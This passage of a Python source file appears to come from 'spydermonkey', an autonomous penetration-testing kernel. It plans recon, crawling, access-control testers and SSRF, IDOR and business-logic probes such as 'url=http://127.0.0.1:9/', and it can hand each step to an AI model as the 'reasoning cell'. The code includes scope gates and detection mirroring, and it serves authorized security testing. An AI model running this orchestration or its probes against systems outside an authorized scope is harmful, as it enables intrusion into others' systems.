                                             "rc": r["rc"], "elapsed": r["elapsed"]}
                                            for r in out_rows]})
        st["history"] = st["history"][-25:]
        _atomic_write(_camp(args.target) / "fleet-state.json",
                      json.dumps(st, indent=2) + "\n")
    except Exception:
        pass
    _event(args.target, "fleet.run", f"{up}/{len(seq)} up", ok=up == len(seq),
           elapsed=elapsed)
    if _json_mode(args):
        _emit(args, payload)
    else:
        print(f"\n═══ FLEET REPORT: {up}/{len(seq)} agent(s) up in {elapsed}s"
              f" · joint goal: '{args.goal}' ═══")
    return 0 if up == len(seq) else 1


def _run(argv, timeout=60, env=None):
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout,
                           env=env)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return f"error: timed out after {timeout}s", 1
    except Exception as e:
        return f"error: {e}", 1


def _exec_arsenal(a):
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "arsenal", str(Path(__file__).resolve().parent / "arsenal.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    argv = [a.action]
    if a.action in ("plan", "run"):
        if not getattr(a, "target", None):
            raise UsageError(f"arsenal {a.action} needs --target")
        argv += ["--target", a.target]
    if a.action in ("plan", "run") and getattr(a, "wordlist", None):
        argv += ["--wordlist", a.wordlist]
    if a.action == "install":
        if getattr(a, "tool", None):
            argv += ["--tool", a.tool]
        if getattr(a, "chain", None):
            argv += ["--chain", a.chain]
        if getattr(a, "machine", None):
            argv += ["--machine", a.machine]
        if getattr(a, "dry_run", False):
            argv += ["--dry-run"]
    if a.action == "run":
        if getattr(a, "only", None):
            argv += ["--only", a.only]
        if getattr(a, "dry_run", False):
            argv += ["--dry-run"]
        if getattr(a, "timeout", None):
            argv += ["--timeout", str(a.timeout)]
        if getattr(a, "output_dir", None):
            argv += ["--output-dir", a.output_dir]
    if getattr(a, "json", False):
        argv += ["--json"]
    return mod.main_with(argv)


# ════════════════════════════════════════════════════════════════════════════
# v4.0 — THE AUTONOMOUS KERNEL (the engine is the state machine; ANY model is
# a swappable reasoning cell). next → directive · absorb → validated ingest ·
# loop → the brrrr (autopilot without a model, or --agent-cmd with any model)
# ════════════════════════════════════════════════════════════════════════════

KERNEL_EXIT = {"continue": 0, "blocked": 1, "usage": 2, "complete": 5}


def _kernel_state(target):
    camp = _camp(target)
    st = _load_json(camp / "kernel-state.json",
                    {"target": target, "steps": [], "created": _now()})
    st.setdefault("steps", [])
    return st


def _kernel_save(target, st):
    (_camp(target) / "kernel-state.json").write_text(json.dumps(st, indent=2) + "\n")


def _planner_directive(target, url=None, domain=None, include_planned: bool = False):
    """THE PLANNER — deterministic, state-driven. Reads every family state and
    returns the ONE next action that closes the biggest gap. No model needed:
    the reasoning is policy in code; a model only adds judgment on top."""
    camp = _camp(target)
    scope = _load_scope()
    board = _load_json(camp / "phases-state.json", {})
    ledger = _ledger_load(target)
    ctx = _load_json(camp / "context.json", {"endpoints": [], "roles": [],
                                             "credentials": [], "functions": []})
    chains = _load_json(camp / "chain-state.json", {}).get("chains", [])
    kstate = _kernel_state(target)
    done_ids = {s.get("directive_id") for s in kstate["steps"]
                if s.get("absorbed") or (s.get("planned") and include_planned)}

    def d(did, phase, mandate, action, argv, why, expect, walls):
        return {"directive_id": did, "step": len(kstate["steps"]) + 1,
                "phase": phase, "mandate": mandate, "action": action,
                "argv": argv, "why": why, "expect": expect, "walls": walls,
                "target": target, "url": url, "domain": domain}

    # 1. the estate gate comes first — nothing plans without a scope authority
    if scope is None:
        return d("scope-init", "scope_analysis", "barbican", "scope",
                 ["scope", "init", "--engagement", target,
                  "--in-scope", (domain or url or "CHANGE.ME")],
                 "no scope authority — the live-fire rule closes every engine",
                 "scope.json written; engines unlock",
                 ["declared estates only"])
    # 2. the shield — posture before anything
    if "barbican-posture" not in done_ids:
        return d("barbican-posture", "scope_analysis", "barbican", "posture",
                 ["barbican-posture", "--target", target],
                 "no verified vantage — barbican hard-gates the family",
                 "posture recorded; exit vantage verified",
                 ["zero documents"])
    # 3. passive recon — the finder (real domains only: the finder classifies
    #    domains by industry; lab campaigns skip straight to the descent)
    if not _is_lab(url or "") and not _phase_deliverable(target, PHASES[1]) \
            and "holy-recon" not in done_ids:
        return d("holy-recon", "passive_recon", "holyshit", "recon",
                 ["holyshit-recon", "--target", target,
                  "--domain", domain or (url or "CHANGE.ME")],
                 "phase passive_recon has no deliverable — the dossier feeds everyone",
                 "dossier + context endpoints registered",
                 ["passive-first"])
    # 4. active recon — the descent (real engine, real url needed)
    if url and not _phase_deliverable(target, PHASES[2]) and "undercroft-run" not in done_ids:
        return d("undercroft-run", "active_recon", "undercroft", "run",
                 ["undercroft-run", "--target", target, "--url", url,
                  "--domain", domain or "CHANGE.ME"],
                 "phase active_recon: the descent probes the target's own skin",
                 "CONFIRMED seams in undercroft-state",
                 ["validation-only", "no-gain"])
    # 5. THE SURFACE ENGINE first — the kernel discovers its own strike map
    if url and not _load_json(_camp(target) / "crawl-state.json", {}) \
            and "crawl-surface" not in done_ids:
        return d("crawl-surface", "active_recon", "spy", "crawl",
                 ["crawl", "--target", target, "--url", url],
                 "no surface map yet — the crawl mines endpoints/params from "
                 "links, forms and JS, and autofills the session context",
                 "crawl-state.json + context.endpoints filled",
                 ["same-origin only", "in-scope only"])
    # 6. the testers — one directive covers 8 differential classes over the MINED surface
    classes = {r["cls"] for r in ledger}
    if url and "testers-run" not in done_ids and "IDOR" not in classes:
        return d("testers-run", "authorization_testing", "spy", "testers",
                 ["testers", "--target", target, "--url", url],
                 "no access-control findings yet — 18 differential testers, one pass",
                 "0-8 ledger rows (deduped, evidence-gated)",
                 ["in-scope only", "documented-PoC payloads"])
    # 6. targeted class holes → focused gate runs, ORDERED BY LEARNED PRIORS
    #    (train writes hit rates; the planner shoots the highest-yield class first —
    #    estate memory re-ranks when this estate confirmed a class before)
    emem = _estate_memory(target)
    past = set(emem.get("classes", []))
    hole_classes = [("AUTHN", "token="), ("BIZLOGIC", "amount=-1"),
                    ("SSRF", "url=http://127.0.0.1:9/")]
    if url and "IDOR" not in classes:
        hole_classes.insert(0, ("IDOR", "org_id=foreign"))
    for cls in _prior_order([c for c, _ in hole_classes]):
        probe_q = next(q for c, q in hole_classes if c == cls)
        if url and cls not in classes and f"gate-{cls}" not in done_ids:
            why = f"ledger hole: no {cls}-class finding — a focused 3-gate run"
            if cls in past:
                why += f" (estate memory: {cls} confirmed here before — priority)"
            return d(f"gate-{cls}", "input_validation", "spy", "gate",
                     ["gate", "--target", target, "--url", url,
                      "--attack-query", probe_q, "--append-query"],
                     why,
                     "CONFIRMED / HYPOTHESIS / or DISPROVEN (all are results)",
                     ["in-scope only", "validation-only"])
    # 7. chains — findings combine into kill chains
    if len([r for r in ledger if r["status"] == "CONFIRMED"]) >= 2 and not chains \
            and "chain-detect" not in done_ids:
        return d("chain-detect", "business_logic", "kairo", "chain",
                 ["chain", "detect", "--target", target],
                 "2+ confirmed findings — low findings may chain into high impact",
                 "chain-state.json with candidates + plans",
                 ["no novel exploitation"])
    # 7.5 THE REASONING ENGINE — when the batteries are done but surface
    # remains, the planner hands the loop to hypothesis generation: the
    # datasets reason out unconfirmed instances; a model (or the operator)
    # runs the cards through the same gates.
    if (ctx.get("endpoints") and "hypothesis-gen" not in done_ids
            and any(r["status"] == "CONFIRMED" for r in ledger)):
        return d("hypothesis-gen", "input_validation", "spy", "hypothesis",
                 ["hypothesis", "gen", "--target", target],
                 "confirmed classes + untested surface — the reasoning engine "
                 "ranks unconfirmed instances (variants · cve-map · chains) "
                 "for the next pass",
                 "hypothesis-state.json with ranked, wall-checked cards",
                 ["declared estates only", "documented-PoC adaptation only",
                  "validation-only · NO-GAIN"])
    # 7.55 THE SOURCE LANE — when the context carries a source root, the
    # discovery engine reasons over the target's own code: candidate
    # instances of documented classes, ranked, gate-ready.
    _src = ctx.get("source")
    if isinstance(_src, list):
        _src = _src[0] if _src else None
    if isinstance(_src, dict):
        _src = _src.get("value")
    if _src and "source-discover" not in done_ids:
        return d("source-discover", "input_validation", "spy", "discover",
                 ["discover", "--target", target, "--source", str(_src)],
                 "a source root is in context — the discovery engine scans it "
                 "read-only for documented-class instances the batteries never fired at",
                 "discovery-state.json with ranked, gate-ready cards",
                 ["declared estates only", "documented-PoC adaptation only",
                  "validation-only · NO-GAIN"])
    # 7.6 fire the top card — the engine executes its own hypothesis
    if ("hypothesis-gen" in done_ids and "hypothesis-run" not in done_ids
            and (camp / "hypothesis-state.json").exists()):
        return d("hypothesis-run", "input_validation", "spy", "hypothesis",
                 ["hypothesis", "run", "--target", target],
                 "the engine ranked the cards — fire the top executable one "
                 "through the same gates: confirmed → a NEW finding; "
                 "identical → an honest DISPROVEN",
                 "a ledger row (CONFIRMED/HYPOTHESIS) or a clean DISPROVEN",
                 ["declared estates only", "validation-only · NO-GAIN"])
    # 8. detection — the purple leg
    if any(r["status"] == "CONFIRMED" for r in ledger) and "kage-mirror" not in done_ids:
        return d("kage-mirror", "reporting", "kage", "mirror",
                 ["kage-mirror", "--target", target],
                 "confirmed attacks get mirrored as Sigma rules (the purple leg)",
                 "kage rules + refire evidence",
                 ["detection-only"])
    # 9. harvest pricing
    if any(r["status"] == "CONFIRMED" for r in ledger) and "shukaku-ingest" not in done_ids:
        return d("shukaku-ingest", "data_protection", "shukaku", "ingest",
                 ["shukaku-ingest", "--target", target],
                 "confirmed findings priced for the business verdict",
                 "crown rows with classes + pricing",
                 ["counts, never corpora"])
    # 10. the war report — every engagement closes with the joint deliverable
    if "war-report" not in done_ids:
        return d("war-report", "reporting", "spy", "report",
                 ["report", "--target", target],
                 "every engagement closes with the joint deliverable",
                 "the war report md with findings + chains + coverage",
                 ["zero documents"])
    # 11. coverage guard — anything still open goes to the loop's next pass
    return None


_RESULT_SCHEMA = {
    "step": int, "exit": int,
    "findings": list,   # [{title, cls, asset, severity, proof, cwe?}]
    "context": dict,    # {endpoints: [], credentials: [], roles: [], functions: []}
    "notes": str,
}


def cmd_absorb(args):
    """THE ABSORBER — validate a result through the family's gates, ingest it,
    and hand back the next directive. The loop closes here."""
    st = _kernel_state(args.target)
    try:
        res = json.loads(Path(args.file).read_text())
    except Exception as e:
        print(f"✗ unreadable result: {e}", file=sys.stderr)
        return KERNEL_EXIT["usage"]
    bad = []
    for k, t in _RESULT_SCHEMA.items():
        if k not in res:
            bad.append(k)
        elif not isinstance(res[k], t) and not (t is int and isinstance(res[k], float)):
            bad.append(f"{k}!={t.__name__}")
    if bad:
        print(f"✗ result schema violations: {', '.join(bad)} — see next --json", file=sys.stderr)
        return KERNEL_EXIT["usage"]
    did = res.get("directive_id") or f"step-{res.get('step')}"
    # ingest findings through the LEDGER's own gates (scope · dedupe · evidence)
    ingested = 0
    for f in res.get("findings", []):
        try:
            e = _cmd_ledger_internal(args.target,
                                     f.get("title", "agent finding"),
                                     f.get("cls", "GENERAL"),
                                     f.get("asset", ""),
                                     f.get("severity", "medium"),
                                     f.get("proof", ""), f.get("cwe"))
            if e:
                ingested += 1
        except ScopeDenied as ex:
            print(f"  ✗ finding REFUSED by the ledger: {ex}", file=sys.stderr)
        except Exception as ex:
            print(f"  ⚠ finding not ingested: {type(ex).__name__}: {ex}", file=sys.stderr)
    # merge context
    camp = _camp(args.target)
    ctx = _load_json(camp / "context.json", {"endpoints": [], "roles": [],
                                             "credentials": [], "functions": []})
    merged = 0
    for k, vals in (res.get("context") or {}).items():
        if k in ctx:
            for v in vals:
                if v and v not in ctx[k]:
                    ctx[k].append(v)
                    merged += 1
    (camp / "context.json").write_text(json.dumps(ctx, indent=2) + "\n")
    # record the step
    st["steps"].append({"directive_id": did, "step": res.get("step"),
                        "exit": res.get("exit"), "absorbed": True,
                        "findings": ingested, "context": merged,
                        "notes": (res.get("notes") or "")[:200], "at": _now()})
    _kernel_save(args.target, st)
    ledger = _ledger_load(args.target)
    print(f"═══ ABSORBED — step {res.get('step')} ({did}) ═══")
    print(f"  ▸ {ingested} finding(s) through the ledger gates · {merged} context row(s)")
    print(f"  ▸ ledger now {len(ledger)} row(s) · "
          f"{sum(1 for r in ledger if r['status'] == 'CONFIRMED')} confirmed")
    if res.get("exit") not in (0, None):
        print(f"  ⚠ directive exited {res.get('exit')} — recorded; the planner adapts")
    dv = _planner_directive(args.target, url=args.url, domain=args.domain)
    if dv is None:
        print("✓ MISSION COMPLETE — no open directives remain", file=sys.stderr)
        return KERNEL_EXIT["complete"]
    print(f"  next directive: spydermonkey next --target {args.target}"
          f"   ({dv['directive_id']} [{dv['phase']}])")
    return KERNEL_EXIT["continue"]


_AGENT_PROMPT = """You are the reasoning cell of the SPYDERMONKEY autonomous kernel \
(HolyShit offensive-security family). The ENGINE owns planning, scope gates, and \
evidence discipline — you own judgment and execution.

DIRECTIVE (step {step}) [{phase}] via {mandate}:
  execute:  spydermonkey {argv}
  why: {why}
  expect: {expect}
  walls: {walls}

After running it, write a result JSON to {result_path} with EXACTLY this shape:
{{"step": {step}, "directive_id": "{did}", "exit": <exit code>, "findings": [], \
"context": {{"endpoints": [], "credentials": [], "roles": [], "functions": []}}, \
"notes": "one paragraph"}}
Findings you discovered beyond the directive belong in findings[] — the absorber \
runs them through the same evidence gates (proof needs "baseline: … attack: … diff: …")."""


def cmd_loop(args):
    """THE BRRRR — the engine drives. Without --agent-cmd the engines execute
    their own directives (autopilot). With --agent-cmd, ANY model becomes the
    reasoning cell: the engine plans → the agent executes → the absorber
    validates through the gates → repeat, until coverage is complete."""
    url = args.url
    domain = args.domain
    st = _kernel_state(args.target)
    total_findings = 0
    print(f"═══ SPYDERMONKEY KERNEL LOOP — target '{args.target}' "
          f"(max {args.max_steps} steps, agent: {args.agent_cmd or 'AUTOPILOT (engines direct)'}) ═══")
    if args.plan_only:
        n = 0
        while True:
            dv = _planner_directive(args.target, url=url, domain=domain,
                                    include_planned=True)
            if dv is None:
                break
            n += 1
            print(f"  {n:2d}. [{dv['phase']:22s}] {dv['directive_id']:18s} "
                  f"spydermonkey {' '.join(dv['argv'])[:80]}")
            st["steps"].append({"directive_id": dv["directive_id"],
                                "step": dv["step"], "exit": None,
                                "absorbed": False, "planned": True, "at": _now()})
            # the planner reads the DISK state — persist each planned step or
            # the next iteration replans the same directive forever
            _kernel_save(args.target, st)
            if n >= args.max_steps:
                break
        _kernel_save(args.target, st)
        print(f"═══ battle plan: {n} directive(s) — loop without --plan-only to fire ═══")
        return KERNEL_EXIT["continue"]
    for step in range(1, args.max_steps + 1):
        dv = _planner_directive(args.target, url=url, domain=domain)
        if dv is None:
            print(f"═══ LOOP COMPLETE — {step - 1} step(s) · "
                  f"{total_findings} finding(s) · mission done ═══")
            _estate_write_from_ledger(args.target)
            return KERNEL_EXIT["complete"]
        argv_str = " ".join(dv["argv"])
        print(f"\n▸ step {step}: [{dv['phase']}] {dv['directive_id']} — {argv_str[:90]}")
        result_path = str(_camp(args.target) / f"result-step{step}.json")
        exit_code = 0
        if args.agent_cmd:
            prompt = _AGENT_PROMPT.format(step=step, phase=dv["phase"],
                                          mandate=dv["mandate"], argv=argv_str,
                                          why=dv["why"], expect=dv["expect"],
                                          walls=" · ".join(dv["walls"]),
                                          result_path=result_path, did=dv["directive_id"])
            try:
                r = subprocess.run(args.agent_cmd.split() + [prompt],
                                   timeout=args.agent_timeout)
                exit_code = r.returncode
            except subprocess.TimeoutExpired:
                print(f"  ✗ agent timed out after {args.agent_timeout}s — stopping",
                      file=sys.stderr)
                return KERNEL_EXIT["blocked"]
            if not Path(result_path).exists():
                print(f"  ✗ agent produced no result at {result_path} — the loop"
                      f" requires the contract; stopping (nothing is lost: the"
                      f" step is recorded)", file=sys.stderr)
                st["steps"].append({"directive_id": dv["directive_id"],
                                    "step": step, "exit": exit_code,
                                    "absorbed": False, "at": _now()})
                _kernel_save(args.target, st)
                return KERNEL_EXIT["blocked"]
        else:
            # AUTOPILOT: the engine executes its own directive
            argv = _autopilot_argv(dv)
            if argv is None:
                print(f"  ⚠ no autopilot for {dv['directive_id']} — needs an agent"
                      f" (--agent-cmd); stopping")
                return KERNEL_EXIT["blocked"]
            try:
                r = subprocess.run(argv, timeout=args.agent_timeout)
                exit_code = r.returncode
            except FileNotFoundError:
                print(f"  ✗ engine not on disk: {argv[0]} — install the family"
                      f" (see README → Quickstart); stopping", file=sys.stderr)
                st["steps"].append({"directive_id": dv["directive_id"],
                                    "step": step, "exit": 1,
                                    "absorbed": False, "at": _now()})
                _kernel_save(args.target, st)
                return KERNEL_EXIT["blocked"]
            except subprocess.TimeoutExpired:
                print(f"  ✗ engine timed out after {args.agent_timeout}s — stopping",
                      file=sys.stderr)
                st["steps"].append({"directive_id": dv["directive_id"],
                                    "step": step, "exit": 124,
                                    "absorbed": False, "at": _now()})
                _kernel_save(args.target, st)
                return KERNEL_EXIT["blocked"]
            Path(result_path).write_text(json.dumps(
                {"step": step, "directive_id": dv["directive_id"],
                 "exit": exit_code, "findings": [], "context": {},
                 "notes": f"autopilot: {argv_str}"}) + "\n")
        rc = cmd_absorb(type("A", (), {"target": args.target, "file": result_path,
                                       "url": url, "domain": domain})())
        # TRACE HOOK — the training-data collector: every step records the
        # directive the state demanded, the result the engine produced, and the
        # verdict the absorber ruled. This is what the reasoning cell learns from.
        trace_file = getattr(args, "trace_file", None)
        if trace_file:
            findings_before = st.get("_findings_before", 0)
            findings_after = len(_ledger_load(args.target))
            st["_findings_before"] = findings_after
            try:
                result = json.loads(Path(result_path).read_text())
            except Exception:
                result = {}
            trace = {"ts": _now(), "target": args.target,
                     "state": {"step": step, "phase": dv["phase"],
                               "step_number": dv.get("step"),
                               "prior_findings": findings_before},
                     "directive": {"id": dv["directive_id"], "mandate": dv["mandate"],
                                   "argv": dv["argv"], "why": dv.get("why"),
                                   "expect": dv.get("expect"),
                                   "walls": dv.get("walls")},
                     "result": result, "absorb_rc": rc,
                     "verdict": ("complete" if rc == KERNEL_EXIT["complete"]
                                 else "blocked" if rc != KERNEL_EXIT["continue"]
                                 else "continue"),
                     "new_findings": max(0, findings_after - findings_before)}
            with open(trace_file, "a") as tf:
                tf.write(json.dumps(trace) + "\n")
        # count what the pass produced
        total_findings = len(_ledger_load(args.target))
        if rc == KERNEL_EXIT["complete"]:
            print(f"═══ LOOP COMPLETE — {step} step(s) · {total_findings} finding(s)"
                  f" in the ledger · mission done ═══")
            return KERNEL_EXIT["complete"]
        if rc != KERNEL_EXIT["continue"]:
            print(f"═══ LOOP BLOCKED at step {step} (rc={rc}) ═══")
            return rc
    print(f"═══ LOOP MAX-STEPS ({args.max_steps}) — resume with the same command ═══")
    return KERNEL_EXIT["continue"]


def _ctx_source(target: str) -> str:
    """The context's source root (v7.0 source lane) — '.' when unset."""
    v = _load_json(_camp(target) / "context.json", {}).get("source")
    if isinstance(v, list):
        v = v[0] if v else None
    if isinstance(v, dict):
        v = v.get("value")
    return str(v) if v else "."


def _autopilot_argv(dv):
    """Kernel directive ids → the REAL engine argv (own processes, real states).
    Engines always run via sys.executable — script exec-bits are not a given."""
    t = dv["target"]
    u = dv.get("url")
    dm = dv.get("domain") or u or t
    sm = str(Path(__file__).resolve())
    lab = u and _is_lab(u)
    m = {
        "scope-init": [sm, "scope", "init", "--engagement", t,
                       "--in-scope", dm],
        "barbican-posture": [str(SEC / "barbican/scripts/barbican.py"),
                             "posture", "--target", t,
                             "--vantage", "lab" if lab else "vm",
                             "--alias", f"op-{t}"],
        "holy-recon": [str(SEC / "holyshit-mode/scripts/finder.py"),
                       "recon", "--domain", dm],
        "undercroft-run": [str(SEC / "undercroft/scripts/undercroft.py"),
                           "run", "--target", t, "--url", u, "--domain", dm],
        "crawl-surface": [sm, "crawl", "--target", t, "--url", u],
        "testers-run": [sm, "testers", "--target", t, "--url", u],
        "gate-AUTHN": [sm, "gate", "--target", t, "--url", u,
                       "--attack-query", "token=", "--append-query"],
        "gate-BIZLOGIC": [sm, "gate", "--target", t, "--url", u,
                          "--attack-query", "amount=-1", "--append-query"],
        "gate-SSRF": [sm, "gate", "--target", t, "--url", u,
                      "--attack-query", "url=http://127.0.0.1:9/",
                      "--append-query"],
        "chain-detect": [sm, "chain", "detect", "--target", t],
        "hypothesis-gen": [sm, "hypothesis", "gen", "--target", t],
        "hypothesis-run": [sm, "hypothesis", "run", "--target", t],
        "source-discover": [sm, "discover", "--target", t,
                            "--source", _ctx_source(t)],
        "kage-mirror": [str(SEC / "kage/scripts/kage.py"), "mirror", "--target", t],
        "shukaku-ingest": [str(SEC / "shukaku/scripts/shukaku.py"),
                           "ingest", "--target", t, "--finding", "kernel",
                           "--proof", "autopilot ledger pass"],
        "war-report": [sm, "report", "--target", t],
    }
    argv = m.get(dv["directive_id"])
    if argv is None:
        return None
    return [sys.executable] + [str(a) for a in argv]


# ════════════════════════════════════════════════════════════════════════════
# v3.0 — THE INTELLIGENCE LAYER (CyberStrike-derived, family-native)
# ════════════════════════════════════════════════════════════════════════════

def _load_json(p, default):
    try:
        return json.loads(Path(p).read_text())
    except Exception:
        return default


# ── 3.1 the 13-phase methodology engine ───────────────────────────────────────

PHASES = [
    {"id": "scope_analysis",         "name": "Scope Analysis & Attack Surface", "mandate": "barbican",
     "pre": [],                      "deliverable": "scope"},
    {"id": "passive_recon",          "name": "Passive Reconnaissance", "mandate": "holyshit",
     "pre": ["scope_analysis"],      "deliverable": "context"},
    {"id": "active_recon",           "name": "Active Recon & Enumeration", "mandate": "undercroft",
     "pre": ["passive_recon"],       "deliverable": "undercroft:surface"},
    {"id": "technology_profiling",   "name": "Technology Profiling", "mandate": "kaisha",
     "pre": ["active_recon"],        "deliverable": "ladder:era"},
    {"id": "authentication_testing", "name": "Authentication Testing", "mandate": "3am",
     "pre": ["technology_profiling"], "deliverable": "ledger:AUTHN"},
    {"id": "session_management",     "name": "Session Management", "mandate": "3am",
     "pre": ["authentication_testing"], "deliverable": "ledger:REPLAY"},
    {"id": "authorization_testing",  "name": "Authorization Testing", "mandate": "spy",
     "pre": ["session_management"],  "deliverable": "ledger:IDOR"},
    {"id": "input_validation",       "name": "Input Validation", "mandate": "spy",
     "pre": ["active_recon"],        "deliverable": "ledger:INJECTION"},
    {"id": "business_logic",         "name": "Business Logic", "mandate": "undercroft",
     "pre": ["active_recon"],        "deliverable": "ledger:BIZLOGIC"},
    {"id": "data_protection",        "name": "Data Protection", "mandate": "shukaku",
     "pre": ["business_logic"],      "deliverable": "ledger:HARVEST"},
    {"id": "api_security",           "name": "API Security", "mandate": "spy",
     "pre": ["active_recon"],        "deliverable": "ledger:MASSASSIGN"},
    {"id": "infrastructure",         "name": "Infrastructure", "mandate": "kaisha",
     "pre": ["active_recon"],        "deliverable": "ladder:hosts"},
    {"id": "reporting",              "name": "Reporting", "mandate": "spy",
     "pre": ["authorization_testing", "input_validation", "business_logic"],
     "deliverable": "report"},
]

SEVERITY_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


def _phase_deliverable(target, ph):
    """Does the phase have at least ONE real deliverable? Checks the family's
    actual state files — statuses are computed, never declared."""
    d = ph["deliverable"]
    camp = _camp(target)
    if d == "scope":
        try:
            scope = sa.load_scope()
        except sa.ScopeError:
            return False
        return scope is not None and not sa.summary(scope)["expired"]
    if d == "context":
        return bool(_load_json(camp / "context.json", {}).get("endpoints"))
    if d == "report":
        return any(camp.glob("*spydermonkey-report.*")) or (camp / "report.md").exists()
    if d == "ladder:era":
        l = _load_json(camp / "ladder-state.json", {})
        return any(h.get("era") or h.get("era_stack") for h in l.get("hosts", []))
    if d == "ladder:hosts":
        l = _load_json(camp / "ladder-state.json", {})
        return bool(l.get("hosts"))
    if d.startswith("ledger:"):
        want = d.split(":", 1)[1].upper()
        ld = camp / "ledger.jsonl"
        if not ld.exists():
            return False
        for line in ld.read_text(errors="replace").splitlines():
            if not line.strip():
                continue
            try:
                e = json.loads(line)
            except Exception:
                continue
            if want in (e.get("cls") or "").upper() or want in (e.get("title", "").upper()):
                return True
        return False
    if ":" in d:
        fname, key = d.split(":", 1)
        st = _load_json(camp / fname, {})
        if not st and fname == "undercroft-state.json":
            st = _load_json(camp / "kenshi-state.json", {})
        return bool(st.get(key))
    return False


def _phase_board(target: str, board: dict | None = None) -> list[dict]:
    board = board if board is not None else _load_json(_camp(target) / "phases-state.json", {})
    done = {p["id"]: _phase_deliverable(target, p) for p in PHASES}
    rows = []
    for p in PHASES:
        manual = board.get(p["id"])
        pre_ok = all(done.get(q, False) for q in p["pre"])
        if manual in ("completed", "blocked", "in_progress", "not_started"):
            status = manual
        else:
            status = "completed" if done[p["id"]] else ("in_progress" if pre_ok else "blocked")
        rows.append({"id": p["id"], "name": p["name"], "mandate": p["mandate"],
                     "status": status, "deliverable": done[p["id"]],
                     "pre_ok": pre_ok, "manual": bool(manual),
                     "command": CMDS.get(p["mandate"], "")})
    return rows


def _next_phase(target: str, board: dict | None = None) -> dict | None:
    rows = _phase_board(target, board)
    for r in rows:
        if r["status"] != "completed":
            return r
    return None


def cmd_phases(args):
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    board = _load_json(camp / "phases-state.json", {})
    if args.clear_override:
        board.pop(args.clear_override, None)
        _atomic_write(camp / "phases-state.json", json.dumps(board, indent=2) + "\n")
        print(f"▸ phase override cleared: {args.clear_override}")
        _event(args.target, "phases.override_cleared", args.clear_override)
        return 0
    if args.set_phase and args.phase_status:
        if args.set_phase not in {p["id"] for p in PHASES}:
            raise UsageError(f"unknown phase: {args.set_phase}")
        board[args.set_phase] = args.phase_status
        _atomic_write(camp / "phases-state.json", json.dumps(board, indent=2) + "\n")
        print(f"▸ phase {args.set_phase} → {args.phase_status} (manual override recorded)")
        _event(args.target, "phases.override", f"{args.set_phase}={args.phase_status}")
        return 0
    rows = _phase_board(args.target, board)
    n_done = sum(1 for r in rows if r["status"] == "completed")
    nxt = _next_phase(args.target, board)
    payload = {"target": args.target, "phases": rows, "complete": n_done,
               "total": len(rows), "percent": round(100.0 * n_done / len(rows), 1),
               "next": nxt}
    if _json_mode(args):
        _emit(args, payload)
        return 0
    print(f"═══ SPYDERMONKEY PHASES — engagement '{args.target}' (13-phase methodology) ═══")
    for r in rows:
        mark = {"completed": "✓", "in_progress": "▸", "blocked": "·",
                "not_started": "·"}[r["status"]]
        extra = " (manual)" if r["manual"] else ""
        print(f"  {mark} {r['id']:22s} [{r['status']:11s}] {r['mandate']:9s}"
              f" — {r['name']}{extra}")
    print(f"═══ {n_done}/{len(rows)} phases complete ({payload['percent']}%) ═══")
    if nxt:
        print(f"  next: {nxt['id']} — run the {nxt['mandate']} mandate")
        if nxt["command"]:
            print(f"        {nxt['command'][:120]}")
    return 0


def cmd_next_phase(args):
    """The phase-board view (no kernel directives): the next 13-phase action."""
    _ensure_campaign(args.target)
    nxt = _next_phase(args.target)
    payload = {"target": args.target, "next": nxt, "done": nxt is None}
    if _json_mode(args):
        _emit(args, payload)
    elif nxt is None:
        print("✓ every phase has a real deliverable — the board is complete")
    else:
        print(f"▸ next for '{args.target}': {nxt['id']} [{nxt['status']}]"
              f" via {nxt['mandate']}")
        print(f"  {nxt['command'] or 'see the mandate contract'}")
        if nxt["status"] == "blocked":
            print("  (prerequisites missing — run the earlier phases first)")
    return 0


def cmd_next(args):
    """THE DIRECTIVE — the planner decides the one next action from real state
    (kernel: argv · why · expect · walls); falls back to the phase board. JSON
    via the shared --json mode."""
    _ensure_campaign(args.target)
    dv = _planner_directive(args.target, url=getattr(args, "url", None),
                            domain=getattr(args, "domain", None))
    nxt = _next_phase(args.target)
    if dv is not None:
        real = _autopilot_argv(dv)
        dv = {**dv,
              "id": dv["directive_id"], "status": "planned",
              "command": (" ".join(real) if real
                          else "spydermonkey " + " ".join(dv["argv"]))}
        payload = {"target": args.target, "next": dv, "done": False}
    elif nxt is not None:
        payload = {"target": args.target, "next": nxt, "done": False}
    else:
        payload = {"target": args.target, "next": None, "done": True}
    if _json_mode(args):
        _emit(args, payload)
        return 0 if not payload["done"] else KERNEL_EXIT["complete"]
    if payload["done"]:
        print("✓ every phase has a real deliverable and no open directives — complete")
        return KERNEL_EXIT["complete"]
    nxt = payload["next"]
    print(f"▸ next for '{args.target}': {nxt['id']} [{nxt['status']}]"
          f" via {nxt['mandate']}")
    if nxt.get("command"):
        print(f"  {nxt['command']}")
    if nxt.get("why"):
        print(f"  why:   {nxt['why']}")
    if nxt.get("walls"):
        print(f"  walls: {' · '.join(nxt['walls'])}")
        print(f"  then:  spydermonkey absorb --target {args.target} --file result.json")
    elif nxt.get("status") == "blocked":
        print("  (prerequisites missing — run the earlier phases first)")
    return 0


# ── 3.2 the finding ledger (v4: signed · deduped · evidence-gated) ───────────

_STOP = set("the a an of on in at to for with and or is are be been it its this that".split())
LEDGER_STATUSES = ("HYPOTHESIS", "CONFIRMED", "FALSE_POSITIVE",
                   "REMEDIATED", "ACCEPTED_RISK")
STATUS_TRANSITIONS = {
    "HYPOTHESIS": {"CONFIRMED", "FALSE_POSITIVE", "ACCEPTED_RISK"},
    "CONFIRMED": {"REMEDIATED", "FALSE_POSITIVE", "ACCEPTED_RISK"},
    "FALSE_POSITIVE": {"HYPOTHESIS"},
    "REMEDIATED": {"CONFIRMED"},
    "ACCEPTED_RISK": {"CONFIRMED", "REMEDIATED"},
}
SEVERITY_SCORE = {"info": 0.0, "low": 2.5, "medium": 5.5, "high": 8.0, "critical": 9.5}

# class → (WSTG, CWE, ATT&CK) — the report/export binding, family canon style
CLASS_BINDINGS = {
    "IDOR": ("WSTG-ATHZ-04", "CWE-639", "T1068"),
    "BOUNDARY": ("WSTG-ATHZ-04", "CWE-639", "T1068"),
    "AUTHZ": ("WSTG-ATHZ-01", "CWE-285", "T1068"),
